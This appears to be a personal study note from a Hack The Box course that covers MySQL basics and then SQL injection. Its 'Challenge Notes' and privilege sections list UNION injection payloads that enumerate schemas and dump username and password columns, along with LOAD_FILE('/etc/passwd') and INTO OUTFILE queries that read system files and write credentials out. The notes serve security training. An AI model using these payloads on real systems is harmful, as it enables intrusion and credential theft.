---
tags:
  - MySQL
  - SQL
---



Getting Access 
```bash 
# Authenticate to mysql for localhost 
mysql -u root -p 

# Authenticate for remote server 
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

```sql
-- Creating a Database
CREATE DATABASE users;
SHOW DATABASES;
USE user; 


-- Creating a table 
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

SHOW TABLES;

-- Describe keyword is used to list the table structure with its fields and data types 
DESCRIBE logins;


-- Updated form of the Table using proper data types and checks 
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

-- Adding new information using the Insert statement 

INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);


-- Insert multiple columns 
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');


-- Alter an already existing table, i.e. adding a new column
ALTER TABLE logins ADD newColumn INT;

-- If you don't want to alter, but rather to update use the UPDAT method

UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;


-- Sorting query results 
SELECT * FROM logins ORDER BY password DESC;

-- Sorting by multiple columns 
SELECT * FROM logins ORDER BY password DESC, id ASC;

-- Limit the amount of search results 
SELECT * FROM logins LIMIT 2; 

-- Limit the amount of search results but with an offset 
SELECT * FROM logins LIMIT 1, 2;


-- Using a  WHERE clause to filter for conditions 
SELECT * FROM table_name WHERE <condition>;

-- Using a LIKE clause 
SELECT * FROM logins WHERE username LIKE 'admin%'


-- Using UNION operator 

SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;

-- To figure out the amount of columns you can use the ORDER BY


-- SCHEMATA can be found as shown below 
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA 

-- TABLES can be shown as below 
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'

-- DUMPING COLUMN INFORMATION 
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -


```




## Subverting Query logic 

SQLi Discovery 

![[sqli_discovery.png]]


## Some Challenge Notes 

```
username='admin' || id = 5)-- AND id > 1


' UNION select 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -


' UNION select 1,database(),3,4-- -

' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -


' UNION select 1,COLUMN_NAME,TABLE_SCHEMA,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -


' UNION select 1,username,password,3 FROM ilfreight.users-- -
```

## Getting privileges 


```sql
SELECT super_priv FROM mysql.user
UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"

-- Having higher privileges we can read files from the current system
SELECT LOAD_FILE('/etc/passwd');

```


Obtaining the value of secure_file_priv in MySQL
```sql
-- find the secure_file_priv 
SHOW VARIABLES LIKE 'secure_file_priv';

-- Get the value 
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

-- Dump credentials into a file
SELECT * from users INTO OUTFILE '/tmp/credentials';


```



